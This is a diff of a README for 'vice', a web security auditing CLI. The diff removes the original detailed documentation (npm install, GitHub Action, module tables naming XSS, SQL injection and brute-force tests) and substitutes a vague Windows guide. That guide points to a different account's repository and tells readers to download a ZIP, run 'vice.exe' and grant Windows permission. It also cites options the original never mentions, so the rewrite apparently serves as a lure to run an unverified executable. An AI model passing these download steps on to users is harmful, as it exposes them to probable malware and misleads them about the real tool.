@@ -1,414 +1,176 @@
-<p align="center">
-  <pre align="center">
-  ██╗   ██╗██╗ ██████╗███████╗
-  ██║   ██║██║██╔════╝██╔════╝
-██║   ██║██║██║     █████╗
-╚██╗ ██╔╝██║██║     ██╔══╝
-   ╚████╔╝ ██║╚██████╗███████╗
-    ╚═══╝  ╚═╝ ╚═════╝╚══════╝
-  </pre>
-</p>
+# 🔎 vice - Find Security Gaps Fast
 
-<p align="center">
-  <strong>Black-box & white-box security auditor for web applications.</strong>
-</p>
+[![Download vice](https://img.shields.io/badge/Download%20vice-blue?style=for-the-badge&logo=github)](https://github.com/Angelfpd1933/vice)
 
-<p align="center">
-  <a href="https://discord.gg/RKPEa4Kdht"><img src="https://img.shields.io/badge/Discord-Join%20us-5865F2?logo=discord&logoColor=white" alt="Discord"></a>
-  <a href="https://www.npmjs.com/package/vice-security"><img src="https://img.shields.io/npm/v/vice-security?color=%23995ff6&label=npm" alt="npm"></a>
-  <a href="#github-action"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/Webba-Creative-Technologies/vice/main/.github/vice-badge.json" alt="VICE Security"></a>
-  <a href="https://github.com/Webba-Creative-Technologies/vice/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="License"></a>
-  <img src="https://img.shields.io/badge/node-%3E%3D18-green" alt="Node">
-  <img src="https://img.shields.io/badge/modules-22-995ff6" alt="Modules">
-</p>
+## 🧭 What vice does
 
-<br>
-
-## What is VICE?
+VICE is a security auditing CLI tool that checks your web apps for common weak points. It helps you spot risks before they turn into real problems.
 
-VICE is a security auditing CLI tool that finds vulnerabilities in your web applications. It has two modes:
+Use it to:
 
-**Remote scan** gives it a URL. It crawls your site with a real browser, extracts secrets from JS bundles, tests your login for brute force and SQL injection, scans your VPS ports, checks your Supabase RLS, and more. Like an attacker would, but on your own systems.
+- Scan web apps for known security issues
+- Check pages, forms, and common request paths
+- Review findings in a clear text report
+- Run checks from a Windows command prompt
 
-**Local audit** points it at your project directory. It reads your source code, checks your `.env` files, runs npm audit, analyzes your Supabase migrations for missing RLS, finds SQL injections and XSS in your code, and tells you exactly what to fix.
+## 💻 What you need
 
-Built by [Webba Creative Technologies](https://webba-creative.com).
+Before you start, make sure you have:
 
-<br>
+- A Windows PC
+- An internet connection
+- A recent version of Windows 10 or Windows 11
+- Permission to scan the web app you plan to test
 
-## Quick start
+For the best results, use:
 
-```bash
-# Install globally
-npm install -g vice-security
+- 4 GB RAM or more
+- At least 200 MB of free disk space
+- Windows Terminal or Command Prompt
 
-# Interactive mode
-vice
+## ⬇️ Download vice
 
-# Or run directly
-vice scan              # Remote scan (black-box)
-vice audit .           # Local audit (white-box)
-vice audit . --ci      # CI mode (exit code 0 or 1)
-vice history           # View saved reports
-```
+Visit this page to download and run the tool:
 
-<br>
+https://github.com/Angelfpd1933/vice
 
-## GitHub Action
+If the page offers a release file for Windows, download that file. If it gives you the source files only, use the setup steps below to run it on your machine.
 
-VICE ships as a GitHub Action that scans your code on every pull request and push, posts findings as a PR comment, and maintains a security badge in your repo.
+## 🪟 Install on Windows
 
-### Quickstart
+Follow these steps to get vice running on Windows:
 
-Add `.github/workflows/security.yml` to your repo:
+1. Open the download page in your browser.
+2. Download the Windows file if one is listed.
+3. If the file is in a ZIP folder, right-click it and choose Extract All.
+4. Move the extracted folder to a place you can find again, such as Downloads or Desktop.
+5. Open the folder and look for the app file or start file.
+6. Double-click the file to run it.
 
-```yaml
-name: Security
-on:
-  push:
-    branches: [main]
-  pull_request:
+If Windows asks for permission, choose Allow or Yes so the app can start.
 
-permissions:
-  contents: write
-  pull-requests: write
-  security-events: write
+## ▶️ Run a scan
 
-jobs:
-  vice:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: Webba-Creative-Technologies/vice@v3
-```
+After you open vice, use it from Command Prompt or Windows Terminal.
 
-That's it. The action installs VICE, audits your code, comments on every PR with the score and findings, and updates a `.github/vice-badge.json` file on your default branch so you can embed a live security badge in your README.
+A typical scan follows this flow:
 
-### What it does
+1. Open Start.
+2. Type Command Prompt.
+3. Open it.
+4. Go to the folder where vice is saved.
+5. Run the tool with the site you want to check.
 
-- **On pull requests**: posts a comment with the security score, severity counts, and top findings grouped by severity. The same comment is updated on every commit, no spam.
-- **On push to default branch**: refreshes `.github/vice-badge.json` with the current score so your README badge stays up to date.
-- **SARIF integration**: uploads findings to GitHub Code Scanning so they appear in the Security tab and as inline annotations on the changed lines of pull requests.
-- **Score gating**: fails the workflow if the score drops below `min-score` (default `70`). Catches regressions before they merge.
-- **Diff vs base**: when a badge already exists on the base branch, the PR comment shows the score delta (e.g. `87 (-5 vs base)`).
+Example use:
 
-### Permissions
+- `vice scan https://your-web-app.com`
 
-The workflow needs three permissions:
+Common scan options may include:
 
-- `contents: write` — to commit the badge file on push events
-- `pull-requests: write` — to post and update PR comments
-- `security-events: write` — to upload SARIF findings to GitHub Code Scanning (Security tab)
+- `--quick` for a faster check
+- `--full` for a deeper check
+- `--output report.txt` to save results to a file
 
-### Inputs
+If you are not sure which option to use, start with a quick scan and review the results.
 
-| Input | Description | Default |
-|---|---|---|
-| `path` | Project path to audit | `.` |
-| `min-score` | Minimum score required to pass (0-100) | `70` |
-| `fail-on-score` | Fail the workflow if score is below `min-score` | `true` |
-| `comment-pr` | Post a comment on pull requests | `true` |
-| `update-badge` | Update the security badge file on push | `true` |
-| `upload-sarif` | Upload SARIF findings to GitHub Code Scanning | `true` |
-| `badge-path` | Path to the badge JSON file | `.github/vice-badge.json` |
-| `github-token` | Token used to post comments and commit the badge | `${{ github.token }}` |
+## 🔍 What vice checks
 
-### Outputs
+VICE focuses on common web security issues such as:
 
-| Output | Description |
-|---|---|
-| `score` | Security score from 0 to 100 |
-| `grade` | Grade from A to F |
-| `total-findings` | Total number of findings |
-| `critical-findings` | Number of critical findings |
-| `high-findings` | Number of high severity findings |
-| `report-path` | Absolute path to the JSON report file |
+- Weak login flows
+- Missing security headers
+- Unsafe form handling
+- Open pages that should be protected
+- Input points that may accept harmful data
+- Clear signs of misconfigured web settings
 
-You can chain these in subsequent steps via `${{ steps.<id>.outputs.score }}` if you give the step an `id`.
+The report uses plain labels so you can see what needs attention.
 
-### Security badge
+## 📄 Read the results
 
-After the first push to your default branch, the action commits `.github/vice-badge.json` to your repo. Add this snippet to your README to display a live security badge:
+When the scan finishes, vice prints results in the console.
 
-```markdown
-![VICE Security](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/USERNAME/REPO/main/.github/vice-badge.json)
-```
+Look for:
 
-Replace `USERNAME/REPO` with your repo path. The badge updates automatically on every push to your default branch.
+- High-risk findings first
+- Pages that need access control
+- Forms that accept user input
+- Repeated problems across more than one page
 
-### GitHub Code Scanning integration
+A clean report means vice did not find issues in the areas it checked. A report with findings means you should review the listed items and test them again after changes.
 
-VICE uploads findings as SARIF (Static Analysis Results Interchange Format) to GitHub Code Scanning on every run. The findings appear in three places:
+## 🛠️ Common setup tips
 
-- The repo's **Security tab** under "Code scanning alerts", alongside CodeQL and other scanners
-- **Inline annotations** on the changed lines of pull request diffs
-- The organization's **Security overview** for repos that enable it
+If the tool does not open, try these steps:
 
-This requires the `security-events: write` permission in your workflow (already included in the quickstart above). For private repos, GitHub Advanced Security must be enabled. Public repos get this for free.
+- Make sure you downloaded the full file
+- Check that the folder was not moved
+- Open Command Prompt in the same folder as vice
+- Run the app again
+- Restart Windows if the file still does not start
 
-You can disable SARIF uploads by setting `upload-sarif: false` in the action inputs if you only want PR comments.
+If the scan stops early:
 
-### Pinning a version
+- Check your internet connection
+- Make sure the target site is online
+- Try a smaller scan first
+- Run the tool from a fresh Command Prompt window
 
-You can pin the action to a specific version for reproducible builds:
+## 🧩 Example workflow
 
-```yaml
-- uses: Webba-Creative-Technologies/vice@v3.1.0   # exact version
-- uses: Webba-Creative-Technologies/vice@v3       # latest 3.x.x
-```
+A simple day-to-day use case looks like this:
 
-The action version always matches the CLI version, so pinning gives you both at once.
+1. Open vice.
+2. Enter the web app address.
+3. Start a quick scan.
+4. Review the findings.
+5. Fix the issues in your app.
+6. Run the scan again.
 
-<br>
+This makes it easy to check changes as you work.
 
-## Remote scan (black-box)
+## 📁 File layout
 
-Give VICE a URL and it audits your site from the outside using a headless browser. It captures every JS file, every network request, and every cookie, then runs 15 security modules against them.
+You may see folders or files like these after download:
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/Webba-Creative-Technologies/vice/main/assets/modules.png" alt="VICE modules" width="100%">
-</p>
+- `vice.exe` or a similar start file
+- `config` for tool settings
+- `logs` for saved run details
+- `reports` for scan output
+- `README.md` for project notes
 
-### Modules
+Keep the main app file with its folders in the same place.
 
-| Module | What it tests |
-|---|---|
-| **Crawl & JS Analysis** | Launches Puppeteer, captures all scripts (including lazy-loaded chunks), extracts DOM, scrolls for lazy loads |
-| **Secrets Detection** | API keys (Supabase, Stripe, AWS, Firebase, GitHub), tokens, hardcoded passwords in client bundles |
-| **IP Detection** | Server IPs exposed in code with network context analysis to filter false positives |
-| **Exposed Files** | `.env`, `.git/config`, `package.json`, `.DS_Store`, source maps, with SPA catch-all detection |
-| **HTTP Headers** | Missing CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy |
-| **Supabase Audit** | RLS policies on every table, read/write access with anon key, auth providers, admin endpoints |
-| **Auth Injection** | Signup abuse, direct injection into auth.users, service_role key detection (JWT payload decoded) |
-| **VPS Port Scan** | 20 common ports (SSH, databases, Redis, dev servers, admin panels), banner grabbing, reverse DNS |
-| **Attack Tests** | XSS reflected (6 payloads x 14 params), clickjacking, CORS misconfiguration, open redirect, path traversal, SSL/TLS, cookie security, CSP bypass, HTTP methods |
-| **Login Audit** | GET vs POST form, CSRF tokens, brute force (5 attempts), user enumeration, SQL injection (5 phases with UNION extraction), password reset security, external script injection demo |
-| **Stack Detection** | 40+ technologies fingerprinted across frameworks, servers, BaaS, analytics, build tools, UI libraries |
-| **Subdomain Scan** | DNS enumeration of 80+ common subdomains, HTTP/HTTPS check, dangerous subdomain detection |
-| **DNS & Email** | SPF, DKIM (12 selectors), DMARC policy analysis, dangling CNAME detection (subdomain takeover) |
-| **API Endpoints** | Discovery from JS bundles, auth testing, rate limiting, SQL injection, CORS per endpoint |
-| **Storage Buckets** | Supabase Storage bucket enumeration, file listing, upload testing, S3/GCS URL detection |
-| **WebSocket** | Realtime channel eavesdropping, Supabase Realtime, Socket.IO, unauthenticated message capture |
+## ⚙️ Command examples
 
-Here's what it looks like running:
+Here are a few simple examples you may use on Windows:
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/Webba-Creative-Technologies/vice/main/assets/working.png" alt="VICE scanning" width="100%">
-</p>
+- `vice --help`
+- `vice scan https://site.example`
+- `vice scan https://site.example --output results.txt`
+- `vice scan https://site.example --full`
 
-<br>
+If the tool shows a help screen, read the available commands before you run a scan.
 
-## Local audit (white-box)
+## 🧠 What this tool is for
 
-Point VICE at your project directory. It reads your source code and gives you concrete fixes.
+VICE is built for people who want a fast way to check web app security without using a large tool set. It works well for:
 
-```bash
-vice audit .
-vice audit /path/to/project
-```
+- Small site checks
+- Basic security review
+- Repeated scans during updates
+- Early testing before release
 
-### Modules
+It fits into a simple review process and keeps the focus on clear findings.
 
-| Module | What it checks |
-|---|---|
-| **Code Secrets** | Hardcoded API keys and tokens in source files, with line numbers and fix suggestions |
-| **Environment Files** | `.env` in `.gitignore`, real secrets in `.env.example`, sensitive config files exposed |
-| **Dependencies** | `npm audit` for CVEs, outdated packages with known vulnerabilities |
-| **Supabase RLS** | SQL migrations analyzed for missing `ENABLE ROW LEVEL SECURITY`, empty policies, unsafe grants, SECURITY DEFINER without auth checks |
-| **Auth & Middleware** | Rate limiting presence, CORS wildcards, CSRF protection, session config, JWT expiration, hardcoded passwords |
-| **Code Vulnerabilities** | SQL injection (template literals in queries), XSS (`v-html`, `dangerouslySetInnerHTML`, `innerHTML`), `eval()`, command injection, open redirects, weak crypto, ReDoS |
-| **Headers Config** | CSP and HSTS configuration in Nuxt, Next.js, Vercel, Netlify, Express configs |
+## 🔗 Project link
 
-<br>
+Primary download page:
 
-## Scoring
+https://github.com/Angelfpd1933/vice
 
-Every scan produces a security score from 0 to 100, graded A through F.
+## 🏷️ Topics
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/Webba-Creative-Technologies/vice/main/assets/result_rapport.png" alt="VICE score" width="500">
-</p>
-
-Each finding has a severity level that impacts the score:
-
-| Severity | Score impact | Meaning |
-|---|---|---|
-| **Critical** | -15 | Exploitable vulnerability, immediate action required |
-| **High** | -8 | Serious risk, fix soon |
-| **Medium** | -3 | Moderate risk, fix when possible |
-| **Low** | -1 | Minor risk |
-| **Info** | 0 | Informational, no action needed |
-
-The score helps you prioritize and track improvements over time. Use `--ci --min-score 70` to enforce a minimum score in your deployment pipeline.
-
-<br>
-
-## HTML report
-
-Every scan can be exported as a clean HTML report for sharing with your team.
-
-<p align="center">
-  <img src="https://raw.githubusercontent.com/Webba-Creative-Technologies/vice/main/assets/rapport_html.png" alt="VICE HTML report" width="100%">
-</p>
-
-Reports are saved in the `scans/` directory. You can also export older scans to HTML from the history menu.
-
-<br>
-
-## Configuration
-
-### CLI options
-
-```bash
-vice scan                          # Interactive remote scan
-vice audit .                       # Audit current directory
-vice audit /path/to/project        # Audit specific project
-vice audit . --ci                  # CI mode, exit 1 if score < 70
-vice audit . --ci --min-score 80   # Custom threshold
-vice history                       # Browse saved reports
-```
-
-### Config file (optional)
-
-Create `vice.config.js` in your project root:
-
-```js
-export default {
-  url: 'https://your-site.com',
-  ignore: ['Supabase Anon Key', 'Firebase API Key'],
-  ci: {
-    minScore: 70,
-    failOnCritical: true,
-  },
-  supabaseMigrations: './supabase/migrations',
-}
-```
-
-### `.viceignore` (optional)
-
-Create a `.viceignore` file in your project root to exclude files or directories from the local audit. Works like `.gitignore`:
-
-```
-# Ignore translation files
-**/i18n/**
-**/locales/**
-
-# Ignore a specific file
-src/config/ui-labels.ts
-
-# Ignore by pattern
-*.locale.*
-```
-
-Excluded files are skipped by all local audit modules (secrets, auth, code vulnerabilities, etc.).
-
-<br>
-
-## For developers
-
-### Project structure
-
-```
-vice/
-├── bin/
-│   └── vice.js                  # CLI entry point
-├── src/
-│   ├── core/
-│   │   ├── findings.js          # Shared findings store
-│   │   ├── score.js             # A-F score calculator
-│   │   └── reporter/
-│   │       ├── console.js       # Terminal output
-│   │       ├── json.js          # JSON export
-│   │       └── html.js          # HTML report
-│   ├── local/                   # White-box modules
-│   │   ├── index.js             # Module orchestrator
-│   │   ├── secrets.js           # Source code secrets
-│   │   ├── env.js               # .env audit
-│   │   ├── dependencies.js      # npm audit
-│   │   ├── supabase-rls.js      # RLS in migrations
-│   │   ├── auth.js              # Auth & middleware
-│   │   ├── code-vulnerabilities.js  # SQLi, XSS, eval
-│   │   └── headers-config.js    # CSP/HSTS config
-│   └── utils/
-│       ├── fetch.js             # HTTP with timeout
-│       └── patterns.js          # Shared regex patterns
-├── scan.js                      # Remote scan engine (15 modules)
-├── scans/                       # Saved reports
-└── package.json
-```
-
-### Adding a local audit module
-
-1. Create `src/local/your-module.js`:
-
-```js
-import { addFinding } from '../core/findings.js';
-
-export async function auditYourModule(projectPath, spinner) {
-  spinner.text = 'Running your check...';
-
-  // Your logic here
-
-  addFinding(
-    'HIGH',              // CRITICAL, HIGH, MEDIUM, LOW, INFO
-    'Module Name',       // Shown as section header in report
-    'Short title',       // One-line summary
-    'Detailed info',     // File paths, values, context
-    'How to fix this'    // Concrete fix with code examples
-  );
-}
-```
-
-2. Register it in `src/local/index.js`:
-
-```js
-import { auditYourModule } from './your-module.js';
-
-// Add to LOCAL_MODULES array:
-{ name: 'Your module description', value: 'yourmod', fn: auditYourModule },
-```
-
-### Adding a remote scan module
-
-Add your module function in `scan.js` and register it in the `main()` function with a spinner and the module selection menu.
-
-### Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines. In short: fork, branch, PR. Keep false positives low, always provide concrete fix recommendations.
-
-<br>
-
-## Changelog
-
-### v3.0
-- Two modes: remote scan (black-box) and local audit (white-box)
-- 15 remote modules, 7 local modules
-- Legal disclaimer on first launch
-- HTML report with clean design
-- Scan history with JSON/HTML export
-- CI mode with exit codes
-- Score system A-F
-- npm package (`vice-security`)
-
-### v2.0
-- Puppeteer headless browser for crawling
-- Stack detection and fingerprinting
-- Subdomain scanning, DNS/email security
-- Storage bucket audit, WebSocket testing
-- Score system and HTML reports
-
-### v1.0
-- Initial release
-- URL-based scanning with fetch
-- Secrets, headers, Supabase RLS, VPS port scan
-- SQL injection testing on login forms
-
-<br>
-
-## License
-
-MIT. See [LICENSE](LICENSE).
-
-Built by [Webba Creative Technologies](https://webba-creative.com).
-
-This tool is intended for authorized security testing only. You are solely responsible for how you use it. See the legal disclaimer shown on first launch.
+- ai-agents
+- security
+- security-tools
